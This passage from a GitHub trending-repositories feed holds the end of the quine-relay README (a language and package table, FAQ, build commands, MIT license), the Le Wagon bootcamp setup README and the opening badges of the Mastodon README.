&lt;td&gt;62&lt;/td&gt; &#xA;   &lt;td&gt;Emacs Lisp&lt;/td&gt; &#xA;   &lt;td&gt;emacs-nox&lt;/td&gt; &#xA;   &lt;td&gt;1:27.1+1-3ubuntu5&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;63&lt;/td&gt; &#xA;   &lt;td&gt;Erlang&lt;/td&gt; &#xA;   &lt;td&gt;erlang&lt;/td&gt; &#xA;   &lt;td&gt;1:24.2.1+dfsg-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;64&lt;/td&gt; &#xA;   &lt;td&gt;F#&lt;/td&gt; &#xA;   &lt;td&gt;fsharp&lt;/td&gt; &#xA;   &lt;td&gt;4.0.0.4+dfsg2-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;65&lt;/td&gt; &#xA;   &lt;td&gt;FALSE&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;66&lt;/td&gt; &#xA;   &lt;td&gt;Flex&lt;/td&gt; &#xA;   &lt;td&gt;flex&lt;/td&gt; &#xA;   &lt;td&gt;2.6.4-8build2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;67&lt;/td&gt; &#xA;   &lt;td&gt;Fish&lt;/td&gt; &#xA;   &lt;td&gt;fish&lt;/td&gt; &#xA;   &lt;td&gt;3.3.1+ds-3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;68&lt;/td&gt; &#xA;   &lt;td&gt;Forth&lt;/td&gt; &#xA;   &lt;td&gt;gforth&lt;/td&gt; &#xA;   &lt;td&gt;0.7.3+dfsg-9build4.1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;69&lt;/td&gt; &#xA;   &lt;td&gt;FORTRAN77&lt;/td&gt; &#xA;   &lt;td&gt;f2c&lt;/td&gt; &#xA;   &lt;td&gt;20200916-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;70&lt;/td&gt; &#xA;   &lt;td&gt;Fortran90&lt;/td&gt; &#xA;   &lt;td&gt;gfortran&lt;/td&gt; &#xA;   &lt;td&gt;4:11.2.0-1ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;71&lt;/td&gt; &#xA;   &lt;td&gt;Gambas script&lt;/td&gt; &#xA;   &lt;td&gt;gambas3-scripter, gambas3-gb-pcre&lt;/td&gt; &#xA;   &lt;td&gt;3.16.3-3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;72&lt;/td&gt; &#xA;   &lt;td&gt;GAP&lt;/td&gt; &#xA;   &lt;td&gt;gap&lt;/td&gt; &#xA;   &lt;td&gt;4.11.1-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;73&lt;/td&gt; &#xA;   &lt;td&gt;GDB&lt;/td&gt; &#xA;   &lt;td&gt;gdb&lt;/td&gt; &#xA;   &lt;td&gt;12.0.90-0ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;74&lt;/td&gt; &#xA;   &lt;td&gt;GEL (Genius)&lt;/td&gt; &#xA;   &lt;td&gt;genius&lt;/td&gt; &#xA;   &lt;td&gt;1.0.27-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;75&lt;/td&gt; &#xA;   &lt;td&gt;GeneratorScriptingLanguage&lt;/td&gt; &#xA;   &lt;td&gt;generator-scripting-language&lt;/td&gt; &#xA;   &lt;td&gt;4.1.5-3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;76&lt;/td&gt; &#xA;   &lt;td&gt;Gnuplot&lt;/td&gt; &#xA;   &lt;td&gt;gnuplot&lt;/td&gt; &#xA;   &lt;td&gt;5.4.2+dfsg2-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;77&lt;/td&gt; &#xA;   &lt;td&gt;Go&lt;/td&gt; &#xA;   &lt;td&gt;golang&lt;/td&gt; &#xA;   &lt;td&gt;2:1.18~0ubuntu2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;78&lt;/td&gt; &#xA;   &lt;td&gt;GolfScript&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;79&lt;/td&gt; &#xA;   &lt;td&gt;G-Portugol&lt;/td&gt; &#xA;   &lt;td&gt;gpt&lt;/td&gt; &#xA;   &lt;td&gt;1.1-7&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;80&lt;/td&gt; &#xA;   &lt;td&gt;Grass&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;81&lt;/td&gt; &#xA;   &lt;td&gt;Groovy&lt;/td&gt; &#xA;   &lt;td&gt;groovy&lt;/td&gt; &#xA;   &lt;td&gt;2.4.21-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;82&lt;/td&gt; &#xA;   &lt;td&gt;Gzip&lt;/td&gt; &#xA;   &lt;td&gt;gzip&lt;/td&gt; &#xA;   &lt;td&gt;1.10-4ubuntu4&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;83&lt;/td&gt; &#xA;   &lt;td&gt;Haskell&lt;/td&gt; &#xA;   &lt;td&gt;ghc&lt;/td&gt; &#xA;   &lt;td&gt;8.8.4-3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;84&lt;/td&gt; &#xA;   &lt;td&gt;Haxe&lt;/td&gt; &#xA;   &lt;td&gt;haxe&lt;/td&gt; &#xA;   &lt;td&gt;1:4.2.4-1build1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;85&lt;/td&gt; &#xA;   &lt;td&gt;Icon&lt;/td&gt; &#xA;   &lt;td&gt;icont, iconx&lt;/td&gt; &#xA;   &lt;td&gt;9.4.3-7ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;86&lt;/td&gt; &#xA;   &lt;td&gt;INTERCAL&lt;/td&gt; &#xA;   &lt;td&gt;intercal&lt;/td&gt; &#xA;   &lt;td&gt;30:0.30-3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;87&lt;/td&gt; &#xA;   &lt;td&gt;Jasmin&lt;/td&gt; &#xA;   &lt;td&gt;jasmin-sable&lt;/td&gt; &#xA;   &lt;td&gt;2.5.0-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;88&lt;/td&gt; &#xA;   &lt;td&gt;Java&lt;/td&gt; &#xA;   &lt;td&gt;openjdk-11-jdk&lt;/td&gt; &#xA;   &lt;td&gt;11.0.14.1+1-0ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;89&lt;/td&gt; &#xA;   &lt;td&gt;JavaScript&lt;/td&gt; &#xA;   &lt;td&gt;nodejs&lt;/td&gt; &#xA;   &lt;td&gt;12.22.9~dfsg-1ubuntu3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;90&lt;/td&gt; &#xA;   &lt;td&gt;Jq&lt;/td&gt; &#xA;   &lt;td&gt;jq&lt;/td&gt; &#xA;   &lt;td&gt;1.6-2.1ubuntu3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;91&lt;/td&gt; &#xA;   &lt;td&gt;JSFuck&lt;/td&gt; &#xA;   &lt;td&gt;nodejs&lt;/td&gt; &#xA;   &lt;td&gt;12.22.9~dfsg-1ubuntu3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;92&lt;/td&gt; &#xA;   &lt;td&gt;Kotlin&lt;/td&gt; &#xA;   &lt;td&gt;kotlin&lt;/td&gt; &#xA;   &lt;td&gt;1.3.31+~1.0.1+~0.11.12-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;93&lt;/td&gt; &#xA;   &lt;td&gt;ksh&lt;/td&gt; &#xA;   &lt;td&gt;ksh&lt;/td&gt; &#xA;   &lt;td&gt;20211217&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;94&lt;/td&gt; &#xA;   &lt;td&gt;Lazy K&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;95&lt;/td&gt; &#xA;   &lt;td&gt;Lisaac&lt;/td&gt; &#xA;   &lt;td&gt;lisaac&lt;/td&gt; &#xA;   &lt;td&gt;1:0.39~rc1-3.1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;96&lt;/td&gt; &#xA;   &lt;td&gt;LiveScript&lt;/td&gt; &#xA;   &lt;td&gt;livescript&lt;/td&gt; &#xA;   &lt;td&gt;1.6.1+dfsg-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;97&lt;/td&gt; &#xA;   &lt;td&gt;LLVM asm&lt;/td&gt; &#xA;   &lt;td&gt;llvm&lt;/td&gt; &#xA;   &lt;td&gt;1:14.0-55~exp2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;98&lt;/td&gt; &#xA;   &lt;td&gt;LOLCODE&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;99&lt;/td&gt; &#xA;   &lt;td&gt;Lua&lt;/td&gt; &#xA;   &lt;td&gt;lua5.3&lt;/td&gt; &#xA;   &lt;td&gt;5.3.6-1build1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100&lt;/td&gt; &#xA;   &lt;td&gt;M4&lt;/td&gt; &#xA;   &lt;td&gt;m4&lt;/td&gt; &#xA;   &lt;td&gt;1.4.18-5ubuntu2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;101&lt;/td&gt; &#xA;   &lt;td&gt;Makefile&lt;/td&gt; &#xA;   &lt;td&gt;make&lt;/td&gt; &#xA;   &lt;td&gt;4.3-4.1build1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;102&lt;/td&gt; &#xA;   &lt;td&gt;Maxima&lt;/td&gt; &#xA;   &lt;td&gt;maxima&lt;/td&gt; &#xA;   &lt;td&gt;5.45.1-8&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;103&lt;/td&gt; &#xA;   &lt;td&gt;MiniZinc&lt;/td&gt; &#xA;   &lt;td&gt;minizinc&lt;/td&gt; &#xA;   &lt;td&gt;2.5.3+dfsg1-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;104&lt;/td&gt; &#xA;   &lt;td&gt;MSIL&lt;/td&gt; &#xA;   &lt;td&gt;mono-devel&lt;/td&gt; &#xA;   &lt;td&gt;6.8.0.105+dfsg-3.2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;105&lt;/td&gt; &#xA;   &lt;td&gt;Mustache&lt;/td&gt; &#xA;   &lt;td&gt;ruby-mustache&lt;/td&gt; &#xA;   &lt;td&gt;1.1.1-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;106&lt;/td&gt; &#xA;   &lt;td&gt;NASM&lt;/td&gt; &#xA;   &lt;td&gt;nasm&lt;/td&gt; &#xA;   &lt;td&gt;2.15.05-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;107&lt;/td&gt; &#xA;   &lt;td&gt;Neko&lt;/td&gt; &#xA;   &lt;td&gt;neko&lt;/td&gt; &#xA;   &lt;td&gt;2.3.0-1build3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;108&lt;/td&gt; &#xA;   &lt;td&gt;Nickle&lt;/td&gt; &#xA;   &lt;td&gt;nickle&lt;/td&gt; &#xA;   &lt;td&gt;2.91&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;109&lt;/td&gt; &#xA;   &lt;td&gt;Objective-C&lt;/td&gt; &#xA;   &lt;td&gt;gobjc&lt;/td&gt; &#xA;   &lt;td&gt;4:11.2.0-1ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;110&lt;/td&gt; &#xA;   &lt;td&gt;OCaml&lt;/td&gt; &#xA;   &lt;td&gt;ocaml&lt;/td&gt; &#xA;   &lt;td&gt;4.13.1-3ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;111&lt;/td&gt; &#xA;   &lt;td&gt;Octave&lt;/td&gt; &#xA;   &lt;td&gt;octave&lt;/td&gt; &#xA;   &lt;td&gt;6.4.0-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;112&lt;/td&gt; &#xA;   &lt;td&gt;Ook!&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;113&lt;/td&gt; &#xA;   &lt;td&gt;PARI/GP&lt;/td&gt; &#xA;   &lt;td&gt;pari-gp&lt;/td&gt; &#xA;   &lt;td&gt;2.13.3-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;114&lt;/td&gt; &#xA;   &lt;td&gt;Parser 3&lt;/td&gt; &#xA;   &lt;td&gt;parser3-cgi&lt;/td&gt; &#xA;   &lt;td&gt;3.4.6-3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;115&lt;/td&gt; &#xA;   &lt;td&gt;Pascal&lt;/td&gt; &#xA;   &lt;td&gt;fp-compiler&lt;/td&gt; &#xA;   &lt;td&gt;3.2.2+dfsg-9ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;116&lt;/td&gt; &#xA;   &lt;td&gt;Perl 5&lt;/td&gt; &#xA;   &lt;td&gt;perl&lt;/td&gt; &#xA;   &lt;td&gt;5.34.0-3ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;117&lt;/td&gt; &#xA;   &lt;td&gt;Perl 6&lt;/td&gt; &#xA;   &lt;td&gt;rakudo&lt;/td&gt; &#xA;   &lt;td&gt;2022.02-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;118&lt;/td&gt; &#xA;   &lt;td&gt;PHP&lt;/td&gt; &#xA;   &lt;td&gt;php-cli&lt;/td&gt; &#xA;   &lt;td&gt;2:8.1+92ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;119&lt;/td&gt; &#xA;   &lt;td&gt;Piet&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;120&lt;/td&gt; &#xA;   &lt;td&gt;PostScript&lt;/td&gt; &#xA;   &lt;td&gt;ghostscript&lt;/td&gt; &#xA;   &lt;td&gt;9.55.0~dfsg1-0ubuntu5&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;121&lt;/td&gt; &#xA;   &lt;td&gt;PPT (Punched tape)&lt;/td&gt; &#xA;   &lt;td&gt;bsdgames&lt;/td&gt; &#xA;   &lt;td&gt;2.17-29&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;122&lt;/td&gt; &#xA;   &lt;td&gt;Prolog&lt;/td&gt; &#xA;   &lt;td&gt;swi-prolog&lt;/td&gt; &#xA;   &lt;td&gt;8.4.2+dfsg-2ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;123&lt;/td&gt; &#xA;   &lt;td&gt;Promela (Spin)&lt;/td&gt; &#xA;   &lt;td&gt;spin&lt;/td&gt; &#xA;   &lt;td&gt;6.5.2+dfsg-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;124&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;python3&lt;/td&gt; &#xA;   &lt;td&gt;3.10.4-0ubuntu2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;R&lt;/td&gt; &#xA;   &lt;td&gt;r-base&lt;/td&gt; &#xA;   &lt;td&gt;4.1.2-1ubuntu2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;126&lt;/td&gt; &#xA;   &lt;td&gt;Ratfor&lt;/td&gt; &#xA;   &lt;td&gt;ratfor&lt;/td&gt; &#xA;   &lt;td&gt;1.05-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;127&lt;/td&gt; &#xA;   &lt;td&gt;rc&lt;/td&gt; &#xA;   &lt;td&gt;rc&lt;/td&gt; &#xA;   &lt;td&gt;1.7.4+97.gceb59bb-4&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;128&lt;/td&gt; &#xA;   &lt;td&gt;REXX&lt;/td&gt; &#xA;   &lt;td&gt;regina-rexx&lt;/td&gt; &#xA;   &lt;td&gt;3.6-2.4&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Note that some languages are not available in Ubuntu (marked as &lt;em&gt;N/A&lt;/em&gt;). This repository includes their implementations in &lt;code&gt;vendor/&lt;/code&gt;. See also &lt;code&gt;vendor/README&lt;/code&gt; in detail.&lt;/p&gt; &#xA;&lt;h2&gt;Frequently asked questions&lt;/h2&gt; &#xA;&lt;h3&gt;Q. Why?&lt;/h3&gt; &#xA;&lt;p&gt;A. &lt;a href=&#34;https://github.com/mame/quine-relay/issues/11&#34;&gt;Take your pick&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Q. How?&lt;/h3&gt; &#xA;&lt;p&gt;A. Good news: I published a book, &lt;a href=&#34;http://gihyo.jp/book/2015/978-4-7741-7643-7&#34;&gt;&#34;The world of obfuscated, esoteric, artistic programming&#34;&lt;/a&gt;. It explains how to write a quine, an ascii-art quine, and an uroboros quine like this quine-relay. You can buy my book on &lt;a href=&#34;http://www.amazon.co.jp/dp/4774176435&#34;&gt;amazon.co.jp&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;(It also contains my almost all (about forty) works, including &lt;a href=&#34;http://www.slideshare.net/mametter/ruby-esoteric-obfuscated-ruby-programming-5088683&#34;&gt;alphabet-only Ruby program&lt;/a&gt;, &lt;a href=&#34;https://github.com/mame/radiation-hardened-quine&#34;&gt;radiation-hardened quine&lt;/a&gt;, etc., and explains many techniques to write such programs.)&lt;/p&gt; &#xA;&lt;p&gt;Bad news: It is written in Japanese. I hope you could translate it into English &#xA; &lt;strike&gt;&#xA;  and help me earn royalties&#xA; &lt;/strike&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Q. Language XXX is missing!&lt;/h3&gt; &#xA;&lt;p&gt;A. See &lt;a href=&#34;https://github.com/mame/quine-relay/wiki/Criteria-for-language-inclusion&#34;&gt;the criteria for language inclusion&lt;/a&gt; in detail. (In short: please create a deb package and contribute it to Ubuntu.)&lt;/p&gt; &#xA;&lt;p&gt;See also &lt;a href=&#34;https://github.com/sponsors/mame&#34;&gt;&lt;span&gt;❤️&lt;/span&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Q. Does it really work?&lt;/h3&gt; &#xA;&lt;p&gt;A. &lt;a href=&#34;https://github.com/mame/quine-relay/actions?query=workflow%2ACI&#34;&gt;&lt;img src=&#34;https://github.com/mame/quine-relay/workflows/CI/badge.svg?sanitize=true&#34; alt=&#34;CI&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Q. How long did it take you?&lt;/h3&gt; &#xA;&lt;p&gt;A. &lt;a href=&#34;https://github.com/mame/quine-relay/issues/60&#34;&gt;Do you try to cross the world line?&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Q. The code does not fit into my display!&lt;/h3&gt; &#xA;&lt;p&gt;A. &lt;a href=&#34;https://raw.githubusercontent.com/mame/quine-relay/master/thumbnail.png&#34;&gt;Here you go&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Q. How was the code generated?&lt;/h3&gt; &#xA;&lt;p&gt;A.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ sudo apt-get install rake ruby-cairo ruby-rsvg2 ruby-gdk-pixbuf2 \&#xA;  optipng advancecomp ruby-chunky-png&#xA;$ cd src&#xA;$ rake2.0 clobber&#xA;$ rake2.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;The MIT License applies to all resources &lt;em&gt;except&lt;/em&gt; the files in the &lt;code&gt;vendor/&lt;/code&gt; directory.&lt;/p&gt; &#xA;&lt;p&gt;The files in the &lt;code&gt;vendor/&lt;/code&gt; directory are from third-parties and are distributed under different licenses. See &lt;code&gt;vendor/README&lt;/code&gt; in detail.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;The MIT License (MIT)&lt;/p&gt; &#xA;&lt;p&gt;Copyright (c) 2013, 2014, 2015, 2016, 2017, 2018, 2019, 2020 Yusuke Endoh (@mametter), @hirekoke&lt;/p&gt; &#xA;&lt;p&gt;Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the &#34;Software&#34;), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:&lt;/p&gt; &#xA;&lt;p&gt;The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.&lt;/p&gt; &#xA;&lt;p&gt;THE SOFTWARE IS PROVIDED &#34;AS IS&#34;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>lewagon/setup</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/lewagon/setup</id>
    <link href="https://github.com/lewagon/setup" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Setup instructions for Le Wagon&#39;s students on their first day of Web Development Bootcamp&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;In Chinese?&lt;/h2&gt; &#xA;&lt;p&gt;如果你在参加中文课程，请打开&lt;a href=&#34;https://raw.githubusercontent.com/lewagon/setup/master/README.cn.md&#34;&gt;中文设置指南&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;¿En Español?&lt;/h2&gt; &#xA;&lt;p&gt;Haga clic en &lt;a href=&#34;https://raw.githubusercontent.com/lewagon/setup/master/README.es.md&#34;&gt;este enlace&lt;/a&gt; para acceder a la versión en español de la configuración.&lt;/p&gt; &#xA;&lt;h2&gt;En Français ?&lt;/h2&gt; &#xA;&lt;p&gt;Clique sur &lt;a href=&#34;https://raw.githubusercontent.com/lewagon/setup/master/README.fr.md&#34;&gt;ce lien&lt;/a&gt; pour accéder à la version française du setup.&lt;/p&gt; &#xA;&lt;h2&gt;In English&lt;/h2&gt; &#xA;&lt;p&gt;Setup guides for &lt;a href=&#34;https://www.lewagon.com&#34;&gt;Le Wagon&lt;/a&gt; Web Development course. Please choose your operating system (OS):&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt; &#xA;   &lt;td&gt; &lt;a href=&#34;https://raw.githubusercontent.com/lewagon/setup/master/macos.md&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/lewagon/setup/master/images/apple_logo.png&#34; alt=&#34;macOS&#34;&gt; &lt;/a&gt; &lt;/td&gt; &#xA;   &lt;td&gt; &lt;a href=&#34;https://raw.githubusercontent.com/lewagon/setup/master/windows.md&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/lewagon/setup/master/images/windows_logo.png&#34; alt=&#34;Windows&#34;&gt; &lt;/a&gt; &lt;/td&gt; &#xA;   &lt;td&gt; &lt;a href=&#34;https://raw.githubusercontent.com/lewagon/setup/master/ubuntu.md&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/lewagon/setup/master/images/linux_logo.png&#34; alt=&#34;Ubuntu&#34;&gt; &lt;/a&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt;</summary>
  </entry>
  <entry>
    <title>mastodon/mastodon</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/mastodon/mastodon</id>
    <link href="https://github.com/mastodon/mastodon" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Your self-hosted, globally interconnected microblogging community&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;img src=&#34;https://i.imgur.com/NhZc40l.png&#34; alt=&#34;Mastodon&#34;&gt;&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/mastodon/mastodon/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/mastodon/mastodon.svg?sanitize=true&#34; alt=&#34;GitHub release&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://circleci.com/gh/mastodon/mastodon&#34;&gt;&lt;img src=&#34;https://img.shields.io/circleci/project/github/mastodon/mastodon.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codeclimate.com/github/mastodon/mastodon&#34;&gt;&lt;img src=&#34;https://img.shields.io/codeclimate/maintainability/mastodon/mastodon.svg?sanitize=true&#34; alt=&#34;Code Climate&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://crowdin.com/project/mastodon&#34;&gt;&lt;img src=&#34;https://d322cqt584bo4o.cloudfront.net/mastodon/localized.svg?sanitize=true&#34; alt=&#34;Crowdin&#34;&gt;&lt;/a&gt; &lt;a 